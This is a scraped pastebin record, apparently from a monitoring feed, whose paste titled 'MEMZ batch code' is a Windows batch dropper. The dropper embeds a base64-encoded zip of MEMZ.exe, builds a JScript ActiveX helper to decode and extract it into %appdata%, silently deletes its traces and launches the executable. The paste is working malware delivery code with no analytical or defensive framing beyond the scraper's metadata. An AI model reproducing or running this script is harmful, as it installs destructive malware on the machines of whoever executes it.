{
    "scrape_url": "https://scrape.pastebin.com/api_scrape_item.php?i=TvwMA57y",
    "full_url": "https://pastebin.com/TvwMA57y",
    "date": "1594231165",
    "key": "TvwMA57y",
    "size": 13784,
    "expire": "1595440765",
    "title": "MEMZ batch code",
    "syntax": "dos",
    "user": "",
    "filename": "TvwMA57y",
    "pasteid": "TvwMA57y",
    "pastesite": "pastebin.com",
    "@timestamp": "2020-07-08T17:59:25",
    "MD5": "44fbd58c401a7786da2e8b6a6291379e",
    "SHA256": "d8b47727ea05305ad396977b336c3bfc86ae122cdde01976fa9b0c3a7c2d3f24",
    "raw_paste": "\r\n@echo off\r\n\r\necho UEsDBBQAAAAIAHV36kiQ6IfZcyEAAAA6AAAIAAAATUVNWi5leGXtew10U8e17kg6soUtjACbGGzi>x\r\necho AxgMyD9Hlm1sY4JkW2AH/wjLP5BgB9k6RhKSjqIfbKcJyBgaqw65tM1NIJckNE1705Tcpi3JJWma>>x\r\necho OD830Da0TptFSQOpXx7NFSnhmYRbnIRw3jfnyMZpfmCt99b7WauzvM+c2TOz95699+zZIw71t+wl>>x\r\necho KkIIAxBFQo4QuZjItctJQErWcynk8LTjC44o6o4vaHa6gqw/IGwJ2L1sl93nE0JsJ88Gwj7W5WOr>>x\r\necho G22sV3Dw+dOnJ2XHaTxj9pZ/yKpcE/Dphr2uz6R3pet3qDdvT3BekurLro+kWuGkdZOry0nHf5Vs>>x\r\necho VgshdQo1eXHNzrYJ3ChRKpIVKYRo0Vgu4/Jm4aEDsPFV03clIWqikPonahKJK0nqNu2WBtKxk/Vk>>x\r\necho JZXDKwk5SF82ExJTfImAfogBPnvLCSm9Dl1PFsip+zJ68ZIf4ntDdHnJcYG0V+WeQmJzfsBhD9kJ>>x\r\necho eXmBjCAL/24BRNKGKV8eRu6jPK1E0g0p/MK44fxAMNBF4mvdHB9X9CX0ArxH6JLXTnUgyVbyhXGV>>x\r\necho X73Cf5T/naVl6NzAXVpdaDqec0KJ7eLiU6yJxBLQZRxuf1lHWtvcqR1Gsa2tzXlFZyJO6iRtYpoD>>x\r\necho o9wOMc2EeuC8Ivzn2zrOTtA7l2lrbXPuKjMRMa0I/UPFEfocd94DVJt4wnmQ1kMnxRNGcWhs99uh>>x\r\necho hbv/Frpxj0W0trkV7tniH/ZYLlrdCZQlvHJYPDHw6tI9lnGre6mY5gElq5hGUO2xxKzOwxLJNA3a>>x\r\necho GL/Hcuao5Yzkqm1iePyoZYy6mZjGoNuZiK3sThDTRtG4rePWob+0v9Iqpm2mBN3E+cZcLEgNygsw>>x\r\necho VIdFOitWQOixWME0qOL3l4pHlmM9Rf98zIpxIPk65mH6MVTG4Y6XGbry/nMV4GdrNb7dFm2/+Au6>>x\r\necho B2xuk5jWi0E2a9QyFpc/9gRoOmMqKhpVoJu4lbFdwA2NH9396meimIuZe6Q3a1vsdtrRPmb8m/j0>>x\r\necho 68BAVrppxDQ/XRTl4TZFLZdlLlLbKoYvRy3jsWpMhBZsYlouunYPhxVr0COmLUULeDEtRLU4wUaH>>x\r\necho 0RjzYJs8YGX44l3q2BX0RcMX3Ulnm0RRlIzrsLUOFY/QZb/dZhNPuBXf37Ue9E58f3A9tcllWKdC>>x\r\necho NtJe6ht3XVbMuPcvMIkzG/oU/YyYxknSzNg9CNvYbDbnzTOhHpvsU3ssjx+1PM6h54VSjD9qeYrA>>x\r\necho 66zR8Ei0/VC0/XC0/Ui0/flo+3C0/dVo+7Fo++vR9jfFtJNUwyhuh9tB61aQe1Nyvct4/jV1j+Uk>>x\r\necho BIpJDOjbGXm81Dixe3jHnzFVhT8nGA87HZLr3knnn4y2jw98KoY1bqWY5pQ0TN0oblTqv2WrYstM>>x\r\necho ZFv6c+nwnKHf6k98i0laO6gwr5TwgQvGX5VNP0dHzPlWf81CExnclXIF6jCvlLCB992EurtEttU2>>x\r\necho ND+bGucPMATjVv31HphpaJVkrz/C7hFI51bCW+Jy9l6Vc2zgihhOdDNnW0XqIpSkWPw6XNY5tow6>>x\r\necho KqWY6FafXYHuVhBLMr5tk+Y7TxXK2t8HMmXzTwE19OnQfOqW25a+wFHTbmPEPxiHrdZWp34ebGGV>>x\r\necho LbV24DXNylV0fOC0U5cDV/vDXy8NFdN98SLdOu6iNmcNavjIwHiCbG2KGy2dwIV7nTTWTyjTSc+h>>x\r\necho oTFqulK6KdS3uZNskte0Uvnuo970PxTh9/dYDhy1HKigmzwaPgQP2VBGHeUgSJFo+2PR9sclP3n+>>x\r\necho qOVIkrT7D1DiVHdiGK5STU1/tuCK5M7r17uToE8Sq1XLu1y3QNrlBLvcOVomb3WqmdhSDNj/7DFQ>>x\r\necho ufRxtOXy25bLp9vHT1vG37Zo5JdTxRvKTeSUmqPPVRHp3YnnOy/FDmIuDTcSQ8RGGszEtKeo3Sza>>x\r\necho Z/dpQPnSx3v8ytgrDH29MvRJ7Nn424exn+DNrdp/66VPb57xkz+qWi43xQ5InbR9QtUy3iSmHaL6>>x\r\necho Um6IRzVpm+pasZEPS3EXL+ckH9ljGUNcTHtMYnzZ+Cu95aJTQ4xk/fpW65BlXI9uvIpp6TS2YeCr>>x\r\necho UpAH2UnhqRtYnffNjR8EcVeIJVMZb9y/8atUM33pFNUMSu+bZdXsZmTVwLsr5lJvPizHjiOUdeGG>>x\r\necho V3AgkNghlWycVNk4R6x0oAaN2HfQ406ljPcwM+WFZ9smV37SFm0fkxePCLnHcspqk1cfuwXzhurP>>x\r\necho DLx0YD+V+WKsVkLEJhDjsdKpI4b+FFs6dQAMlK6i/rBBSf0BVpo2pelkyeukzTbUftnW1EoDbfii>>x\r\necho TVaqTQyPyWqVdHPutOXcqeKaKbrxS++leMa2guJUg2bGT7bYwzTkL98IMdyZOPAGXuasbkV3tCUm>>x\r\necho pl2ka9uupKLsVVBR9uzMVUz63sC59C91ithVp7g4VD8miW9dT7dF68DwAese8wGru9BdCMfInOIY>>x\r\necho Uxz/iysw0RX8SElXMMk8deLgaHMniyf2618eGndr3xDl17E3rsRtL51lkmgnpSgm7ROnYgeR9uIw>>x\r\necho HUJ99TU8L+qPDq0aoxib+MfYN7FSCDU0NqHYXgjxVuzUS6fVVupsH8Ld5kCkoWNDr0F5u38fXu5U>>x\r\necho gWxTnGrMoqDbahU9x5pipXKDnm1NoG6TTs5X/36ftU5GsGb5HHe4lQhhUihzT8exIaaNS6ddKKM1>>x\r\necho xoHkRnlMKyrtZDc0u0HKI0wd7S9ryFdlJRzNSmI0Zo9JkWkIvvT4l6QhA3dpVG1Dd+nCZbahrEtV>>x\r\necho EMUUCeW2xnh4z9B0uiL9utT9kts2SahBCaWjnh/MjNrSO25F9kTFoxp/nqZL7S9rKWWkNn9rG3pn>>x\r\necho 6MrQaw04ULRDFg1yAN3GjUNjVe6ktXI289d3aaj43j3rpZxjsRMKGnMrEDYoRkzTyrmIxq2QD1Rp>>x\r\necho 4J76y+vdDIytk2PTYhxTOyaiTutQWIM1bqIHwLhiu9X4+xpb29A4HGXoT7vF7XO7h5jtM/5d29Ed>>x\r\necho ZTqquqPa7Y0r/3zn+6Cye3j7AnfSbe7pG7vLKlrDuu6yulZleBqGtHZH72xVVq4cufMvt90quejb>>x\r\necho m7IvD1VnX35FXFxDz9vFddLTKj0HWdP/iWT8/0I5bCLkGGAUMA7QmWX8d/B+wCS/n19FyCcAzU2E>>x\r\necho pAJYAAdYA3gP+G7UdwDuBzwOeA5wDHACMIL+YcDPAA8D9gJ2AbYBNqDfsUrmcSDO14raBOAA3XGc>>x\r\necho EnLMAlAjcAAToBlAPesOwN9WE/IYYCfAB9gEqAGUAJYAZgGugFcM9SnACOA5wBhwe1fLPHbFeeUD>>x\r\necho 6O8hvxhNvPeVe98+wiifVZJnyC8IOT7bMBx9JfpS9OUXCHmRmA71X3k4MVhcEQmqzupI9o7Blw49>>x\r\necho ceVXkY/F8KWz74qDrx6KvnIo+mH0nf7XiGmij4QvRU+cfVV86pn3qo6odD8nx3UvQpbhh54lR+59>>x\r\necho 6Qghz44kfvTjFw48AuwZu1b1nv3niqbD33wWY8jm42m39F+JPXIXc+jw2I+v/CbyKQn/99boiSej>>x\r\necho L0XOZL1XOTj6XuXwB+rhvygH/xr9sKP/k4sPhV95gZhA6ggWc/IIWAxf+c1Zljx16olDT/RfGX4o>>x\r\necho VNkvHpwRUp09J1IuijgXzOj/5MAjYdVzFx+S+Rz/Ih+Jydmfi+Bw9iWRtDwxMBNFus9rpF8SWFKc>>x\r\necho PHDhwswLhKwj9zMRkTQ2kkcayfu2nVkXshSVDaTBqpyVNaBDUVoZpVUT0SkNWQOpKMoIM1CNohxk>>x\r\necho lJGUu00p589/gKJ8lFH+QL3z/PkU5eYblYOagTUoypOMciTlHnL+g9OnTqMcx5/yI2bg9AfnifLn>>x\r\necho 8we6UVQso2I1qoUp/eS88lO1yswMjCQmjig/ZnadJ7rEROXP5g34UFR+ZuA8iqqXUfk1u0liIhk9>>x\r\necho r7pJ808gSnp6ehJHRkZGE/GiUs5T9WoG3kdRHWNUw5rdScTfk0hU96qVnzD9p0ZUjzKRHtX7jOo8>>x\r\necho o2qZN/AECqNjGJ2GmZNEx/ohyMeJqn3qyBhTykT8zEq16odzB76PwmxmBowojJNhNk8fUJHz7ygv>>x\r\necho MKr7E/t7/MxqhrmHYdbMY5yau8tQPgYwT2kfLOMg6fl35JLih6hy6fErVP86d2A/ipow/fsfUTMJ>>x\r\necho ajJtEG0syE8UqkFmQIGiXpCg1qtV6oyBb6OorYy6RqfexKhzGLVbrd6YqPYmKo7sI49cSNgfVB/6>>x\r\necho buKOhMQd63ZemJml/rGoeeIXSuvHqhq1qkEdmamyZar86bvOj0Ig1R6tap+mf5SoHp2vGk5nqpn+>>x\r\necho 0VHVO0mR06pYDjNz3oAfojL5ScyKpczmzIiKuSuZuXspMzyd+aUuUsb8Npk5maPWabUjWvUNGjWb>>x\r\necho rF6+WN2ZELmgbktT356oDsxU71yuflJM+KmY+PS/9c+cqfhOIzn1dMrlA2Rdc9LGtFmLk3bpUlBm>>x\r\necho mZhZJk1Sf1ZkZtKP0maFpw0QuJSWUUdOJT/NJB1XJ71h1io0O0+PjMzaz8z6HpNUkJFcq5utS0nu>>x\r\necho 0Mx6kImQZA+jakxIDmck75+RvG/G7Hz1rAfV2rZE7U/VyaFMRjdv58GDB1WnmdkDCZHjs6PqyA6t>>x\r\necho g5n9doLWmaXlZiYHGCZXPbswOdIz+9vqSGIqGrF0bTQttYUZVKEYIc87s95NjEzXOtT9fj+jh/9o>>x\r\necho n56nTknRnp65K3EUJXWYuRsVnMfvT32dOs1fMvovZM38nVptvSFCUt9kdirQU5qYNludNjsJepnx>>x\r\necho 7n/OeOu76kPinEUHb/gBo0mv16TeOosVZ2c92Z+YOPu3Nw8chIekZtbtUvn9KmOqtyj10cz+vYmp>>x\r\necho LxrUtfPTUsT0B0RN2n2pY4kgNidPZHfVJVlv7K82zdNxSQfZeZtv6R8ZWViqTl7ALLiQkWyam1Gb>>x\r\necho tLAoISMpsf/0+dR0RvVDQ/9ooirKJD+ZkPG9hIxblmTsSO9PSsp8lMl4KDnjRznaggUL30jOuJyt>>x\r\necho 3XFjhMu8KSmzNidTyIzsXZSekPndfLU1A0Lo3hqPXFhirScPr9154ULWkkcb4HMJo+KCZ/6gqlUv>>x\r\necho vFetshUnb0hZ9B8a1cPlyY8nL09Sq2Lm5I81i25PZipMi57XMfdwiy5nZt+g1v7bwkhWtml+pCe7>>x\r\necho Q/vNUTnmay8yy7QZ2XvZ3G+oc7eqs388g5SKeXN35IoNOSv2LXnoQSx+8X/dkiWYklhu7tiNEV2S>>x\r\necho YJhnYpVjkXmj6dMVTGTzvM+mqe5fnsGlR1JUb92dMZJuvFnN3GVMtc41/gvDHF/GfS9J+0aWOmvx>>x\r\necho jdHZuZvT1J4czSyRM36W+IKYN0/Mn/tdQ0lyZMxQ8UHy3Jx5o3P7N2+e92lycvfywoPpyY8PGk2Z>>x\r\necho 2roi4975EaP24azi0dnaEWt2dP70VfNnvCUmPC/OGBR1u8Qlzb9eMPzrec8tWfjUsoxpOctH0itv>>x\r\necho Tpi9fafen56aXqofnrtrGkpZ5k2Nqb80qq2Z2T9Ki1xIWyjOWS/eYBXT68WSO39vJqJZfDLjQFHl>>x\r\necho aHqEyzi7oopL3zXN759WVlVvzdxjrBqZX3VeS62Q/VzjmpY3blwpKm5dQZ1jmdjIReaO/Xrht5bM>>x\r\necho G1228K2ccv8Ni26IrtSxi4Y5496s7Bn96/ZnrPslU61Qm3YlrHu9psA6svrdh0z9TIFCpHv4E9Ea>>x\r\necho Obt8Y045u2T5D5eX+xct/+iupkiu0bMysropptPHcmxZcyIf36pkcpcX2wQIf6tFHbmQ+w2D5max>>x\r\necho be8Dm95obF/YePf2nFk5dWuOVLcPq+9dciS7KPvFRUXZZPGR6ro17cOa9jfVB4GLLnpxURT4ujUP>>x\r\necho WbbnbM/x147lOJf6l/ldzpqxte1XEu52Lt2eU7fkocUds5gOHdORwuz2L9u+tm5NxxztwBhmdCRp>>x\r\necho +sfWdqRoOtYwHRXqXTX+WmdN+8Xu3f7a/bll+o7hhI4nEgb8y2bltB9L6PfXdrym6d+f2/Em0/EM>>x\r\necho c/f+3E/zs/PRHE7peF1zG2E6/sZgLFl+mzah4/fafnJzx7DneWfNRiEcYLsErz8c4gOs0x5kO3ne>>x\r\necho x4YC9qCTd7CdfWzIybP1lvpbgBPcdl8+2yD0sLzPLdz2fMK3GvrsPrbKHsrPzy/A3eNgIu4fjS1N>>x\r\necho bFVjvbWl2dLE1phtbKXF0sCuaalaZ6lmKzeyzTUWmWBzU+PN5ob86UnTkz4vRo/gywmxnYIQYsN+>>x\r\necho 1r7F7vLlTk8KCmw4yLOuEAspPYJvC637hDD9Z6AFlEh5NX02B/pc6AsJ7FaXxyNz6qFvXXY6vY9y>>x\r\necho CvYFQ7yXjunkpyc5+CDW1oflunzBkN0X8vTlsuDmkMQIBfooz/Jq7OM/AeYBnKGQv7ygYIsgbPHw>>x\r\necho +V1CftfWgiBvD3Q5V9++qhPk9D32Pn1I0FMR9JRlkPd0X2OeU+jRF+oDvFfYxuvt+m2uQDh4LV7e>>x\r\necho Lns3z+u3BfU+IRASfNcaT3lArCDvc0ywoG1vn7474ALymvxcPr4rYO8O6Z32Xr1D6PF5BLsDzCfF>>x\r\necho vS7+W/iQ3iv4+L5r6lLw3eHSd4Ydjr6r3LoDPH9duuwM9+l7eN5BrleuLsExqXq9y4eXYNju0Xfa>>x\r\necho g66uifvM19Lpcdqpavx+3gcC3dT0egfv4UO8XvY5Y+E1aWwxhvQB49bQNXVjD3U547JO6OZac6TR>>x\r\necho +XzvtfTn8mEf+mAlvtfvEQJ8QO+Cozh5veTcnQGhJ8gHrkMf3fYuHvt4K3TStRXbEkoWPJIBv+g8>>x\r\necho +h4hII0p5Awl17MO2NflcUA2D7/FFfo81eu0d4C3wzR0g+oxUR+w+4KCt8ceuB7/wvz4ZvXy3jv0>>x\r\necho cni8zn2ADTcR7ahmHQJddw/vCjigZbxDGaFu2iP7ElzR77kDDY//6+k67L6tkjjXJ/+kDeQp15hj>>x\r\necho 93TrPa5uXm/Ewj28PQh1Q33XmodVIAqGETrsIRdm2j3X9hsEh5B9C6/32wMCtr7XLjlG/N/9ZQf5>>x\r\necho 2vnUVSWrwJRxll87nob9rQgx0tNr78Nf8Hr2u1tw+vRdvM+u97ocrrgj+oQQrOvbxgdCiD3X8GMf>>x\r\necho H7SHuyRpeczyePiukIsG8q+Xd2sAOuV79cEuHDQCji04ErzP5wKpoD/gCvFBSaRJOvDsHj4QzPe6>>x\r\necho ugJCUOgOgaS3gPflhYMF0GsIbAu6hUDYO9G6TYASA3kTrSD92AJGKKBqzfPaPXSXSM6eJ3t+HnVo>>x\r\necho Guk8fXnxE5UOLywp7ewydBXmGcu6i/KKCrtL88o4NIvLVthLVhg7SzqLiqfq2Sux7RTsAUf+NqxG>>x\r\necho EhMWdBT00HiXh+0RnGCfFwoHfHn2vImtlIewJaDtcMEMdk+ek/d4ILefn0Lf77H35Xd5wp3YVlvC>>x\r\necho Lh+lP9nXJfhDLq/rDj6AZUs9k/OoygSoV8J22T3SeQBL834Emy6vg/RQpQMX4LfwDleITEROOi5k>>x\r\necho D271bgkQbxB+0e3aQnHeoB95TYg4+G3eLd5QPvoIeqE3D/F6u2gexa6rratD0lS/MZ4rIc2h2RdN>>x\r\necho erB8dosQz3QcLp7+rESaLLZmtraBtdbabLnsmsYmSytysHq08kkt22ZuagA1EEa6RmrMNWa2geMq>>x\r\necho 2bpCK7vW2Mw2Gdc1I38D8W67y4N0yB6S0yWD0biCdRb1csicaEZzB2VG5WtuqgVBWyPSvKZq1txQ>>x\r\necho za5tbKbtNeamXLayRRKG5nuWhupcVsoMrVWQw8bamrG0eFK4ALKgbsLqLA03N25kK7FSstbSjMyx>>x\r\necho WU4iN7ANlg3NbHNtvYXtrcb4Vgsmg3bTxtqGtWxzI0uXjvXKTKrNzWaasd25qeBOI33g1K20NVZD>>x\r\necho HGSmmAH5W2ubWmystcncsI5duraxwcK2NTU2rF1G9SiLQQVv2GhuYKvM0MtaPsTS+MAiQXRJjs96>>x\r\necho yxbI+qLGQCKM/SaEsAoo9gt/ZFG9fStfLzvuWnrumGleS4itsd5S2Vi9kW1sqLJgJXWwt+VqkmzG>>x\r\necho miBdg5ltaoTG6i0TeUibsw92d0jOwG+TcnYXbDY1710dT6yhc1eQ7Q53baVG9fUhOc0nNr4rHOAr>>x\r\necho aZIdRE+Q2nRLoJT1lrIuFnVpQSmpsW+TMuYJ2thu1OOQDgvd3aDkYAWfnJ+vJhW1PuQEIfZmgfew>>x\r\necho t4exM1hsZP4mKivWy4fosUbFs0O6tWaXmUUk6URIWhBfDzZrLku3rEDvHAE+n62Np+CdvMeFJbI9>>x\r\necho fA6e0gUF+9PPBzxIzemOcSCCOjA+x8tW0oyRksyRPhXDH2YG+qRTFQR7YD36pZi3b/K6kTM9ic2j>>x\r\necho phWErpCBlbMPzG9x5rJVCBSsNR4p2GaXl6crQPrKdiIc8o4FXz7ZJuV6NXaaUMvv68MIiVJcl9uW>>x\r\necho 3i6P3WuXUaSA9BA7CZEu4iQOIhAaIJBgE2rECXs34x5GgxD1H8km7nAwxCKV68IiHHShiB5BF/Ih>>x\r\necho tOIBEncrSQvxpnwPctoDXnlfT164qCVxxvJBatqwLxy0d3ro5NruyVgT5Hkp2Ejk+GAQpzPIhZxC>>x\r\necho OMRu9Qk9tJNmv18UDXcpF06GPtgM83B9lNghdEomiYtEs5yrDClBmVpoqvgOARLSybQRDtLpdjaI>>x\r\necho GxDuo9iRgs/Lw7owEE6/UG6c30Ze8jqc8HBOV0i6blY30jiBQNTQTGOHZYOlCrdVbLpaG1tvrkOg>>x\r\necho tOTSiNJS10zDC4IYokBLQ4vNXFmHfWmuqqltsMR/15cm4Y/u2Doz4i8Ns5glXUkpsqrJYkZoomMa>>x\r\necho EB1B1trYYKullBChQXkj4lW9eS0lXG1hW2xSRJsiCijJ4XJCztrm1dRnvPAZF6H+s2lT/iarsw+3>>x\r\necho FLunOuDaxnPA0cMpPyR9q+cLOTw062oKecwOahwrBiHEb8GB1RBqsruCfA0OXEsgIEjnlY3wACcJ>>x\r\necho wyepP/aAi5UEwG0bwIPeLYSedfTrB+xDKgKwAvFIc0PSGA9hMT8oSbgF7yHQc6HNwssFyO6XqPOg>>x\r\necho uppcLcPxxli81pjkWhevU+N1drzOj9dF8XpjvHbJtWmHXPsfiLcfkeqJbzanA84BjpUD4t9rTvSl>>x\r\necho kM+XtVXNdfRfHeh3j9I3kNlead0T30vmu+iHjNlSMqNDADoyF7j4N5CUPuUjt7PvuOMORyfd4/Qb>>x\r\necho znvI5FzpbmiqwCqv4oySj1V8jof01SP9d60OZhInf+FoJWQXHRf/pnLXevmTy/zOoJzObpY/nZS+>>x\r\necho pczmDBIKiEHFJE6Sobfi6rrfRQTPxhrHp+C+CS0+BpxnCu4J4NJZWdaJstAs6+fMFFwvcHuB27Tq>>x\r\necho Ku47wGmgs1NTxh0BbpAlX1r+8W+KMo+Jf1O0KJGdWANCl9nhoEGPkGpVnYBgYPZI38LWyK019IeT>>x\r\necho iKoRO5YOpgOHFZhZFQ4EEDkncHMVll7XZOtpUiXdkpudNAsn5D+mzJBxtcD+jLF5eN5PFqvbaB68>>x\r\necho BsGFNJEqj0Aji8+BllntwaWgy+uHzJUT79hpFZDN7qhzdQbsgT70pdK11ONI90hUGuxeHqPulrgK>>x\r\necho Xi+I1eHS1EYG43LRQWZyF2OjGnAJ4N5X5bFTHbwwIbkgeJBX+I2FNp/dH3QKCIn3q+LrMxaucQWC>>x\r\necho oTay7yqmAbsbPH+uXOsROieU+Fy8JSmRNEgr8PA+jEPq2mCpMxbmS0G2nUpaL5+QbeSyspn+qOCB>>x\r\necho GHEcIT8h1S4k/7jNTA4j/0WozttcPlzJg5ZecoBU891yk4qFEXXKJtwu6UVPWp6F7iNvfIXyQIra>>x\r\necho TrnLKUY9j6ytC3pIUcb5VAoY8TslNBVnVCMIWy29IK5q8Tnx/jk0+QZG+hzxuTT3wVnfRrZJ2Fof>>x\r\necho MgdylFQH7D21XTSJ+Q7lLBOoriI8pJV+IsD7gas9TbhKkrQp8rSRb1F54E9BIWAVIC0b96+J9iLa>>x\r\necho ruaDW0OCXyZCyJ+JxRf2VjldHkdcZEIySRUyS2q6uPjkAwX1LCpdG2mxWZomLDSbVLpClZ4QtbAt>>x\r\necho FOBhCKm1tro2PuSSYsoeaRa20hMui8hHp9ScPD+D5AFwEbaG/ZOoVrsnDJP+FLbp84fMXbeHXQG+>>x\r\necho Cjc72atekvFreV8TfJleMc3VrWbrBGtyo8JGk2CLnD2ZycLPtdtIApmyDZoFc2DLNlBd8LlR1Ka2>>x\r\necho GkvdhFNqiBXXXpsQ9jngNW21DfX1En42iccNLLPWC4tM7DiMstogVH51Xd2Xh+DrLm8uNxGt3kRM>>x\r\necho AD/gKcAYgM01kQ2AQcAIIDXPRCoAfsA+wCigFMd7L+AIYBxgLUAbcAhwBpCOwLoBMAgYpkHWgDmA>>x\r\necho CGBpIfCAxwDDgDcB9EvUM4AYYAwwDmCMkA+QDmABuYAiwMUS0FthIroV8oFSCpwHMAjYB3gKcBKQ>>x\r\necho jdSjFNAMuBMwCNgHOAw4BhgFaIpBG7ABsA9wCPA8IAZgwGcpoBdwBHAZKQ4Xxt5Ok+sf3IC5DYQc>>x\r\necho nIP1vwJ9xvHL58j47nTImIOzEm3TAULOYvzm9wk5jva+cjLxv0v+HykKko5nuvy/XT6Hp3JyX4Kf>>x\r\necho hhynhlzNU/6+VKzu9XpY3PGCuEutyjHkczm4DnQJDlwPVuW0NK/JK82h2b/PYfcIPn5VTh8fzFl9>>x\r\necho 0/SkCkRR3EBxMQEBX3BVDm635cEuJ++1B/MmfyajPy6V24Pe/G2GHFxEfK5u3C1ap3IDKZatCAUQ>>x\r\necho G2p93UKc2sJrUDMulOZhZpBexHFqxdvABPjb6XWRd1wNM5OdU7vl3Q5B6nDH9bAe+lyVQ7sRccwO>>x\r\necho r8uH8yJgDwmBHDbsMnfRbb4qp9vuCfI5bMFVfgVfzbCi4HPiVRRMrpNqsGBChWh8pcmRgG6A3WZx>>x\r\necho uVwpZ+Ju4TZz3ZyXC3NPcf/ODXNHufe4jziFYZphpiHDsNxgMJQZTAbe4Df0G35h+I3hPcNFw2eG>>x\r\necho tMIVhdWF6wpbCjcVbi0MFe4qvKfwXwofLTxa+Hbhfyv8oPBSYZoxw5hnLDdWG9cZNxm7jT7jncZv>>x\r\necho Gx8z/tL4ivG08V3jZ0ZlUVKRrii9KKsov6ikyFS0vqi1qKMoUHR30f1F3yt6oujVojNFHxbpim8o>>x\r\necho zizOLq4rbireUNxR/I3i14rfKf7P4ovFaSXzS4pLzCVbSrwlwZK+kqGSb5fsK3my5HDJcyUnS86U>>x\r\necho fFjiXhFaMbAiuuKfVvzzit+u+GjF5RXTSvNLS0otpetK15e2lfpL95Q+UPr90qdKXy49VfpeaULZ>>x\r\necho 7DK2LL+stqyzrL9ssOyBskfK/rXsp2XPlA2XHS37sExdvrC8sfyWck95oHx7+UD53vIfl6eunLeS>>x\r\necho XblkJc31D1P9cgyn4bScjkvl0rlMjuWyuaXQNccVQd8V0Hg1V8PVcVaumdvAbYL2HZyT83B+LsT1>>x\r\necho cndyEW4XN8jdw+3l7uP2cQe4g9xj3OPcIVjnMHeEex4WOsa9zo1wb3InuVPcKHeGi3HnuDHuIjfO>>x\r\necho XeaIgTFoDFqDzpBqSDdkGlhDtmGpIdfAGRCHDTUGq2GDYbPBCWv2Gv4XwsY/yv+35X8CUEsBAhQA>>x\r\necho FAAAAAgAdXfqSJDoh9lzIQAAADoAAAgAAAAAAAAAAAAAAP+BAAAAAE1FTVouZXhlUEsFBgAAAAAB>>x\r\necho AAEANgAAAJkhAAAAAA==>>x\r\n\r\necho f=new ActiveXObject(^\"Scripting.FileSystemObject^\");i=f.getFile(^\"x^\").openAsTextStream();>x.js\r\necho x=new ActiveXObject(^\"MSXml2.DOMDocument^\").createElement(^\"Base64Data^\");x.dataType=^\"bin.base64^\";>>x.js\r\necho x.text=i.readAll();o=new ActiveXObject(^\"ADODB.Stream^\");o.type=1;o.open();o.write(x.nodeTypedValue);>>x.js\r\necho z=f.getAbsolutePathName(^\"z.zip^\");o.saveToFile(z);s=new ActiveXObject(^\"Shell.Application^\");>>x.js\r\necho s.namespace(26).copyHere(s.namespace(z).items());o.close();i.close();>>x.js\r\n\r\nset v=\"%appdata%\\MEMZ.exe\"\r\ndel %v% >NUL 2>NUL\r\ncscript x.js >NUL 2>NUL\r\ndel x.js >NUL 2>NUL\r\ndel z.zip >NUL 2>NUL\r\ndel x >NUL 2>NUL\r\nstart \"\" %v%",
    "YaraRule": [
        "enable_org32",
        "core_keywords"
    ]
}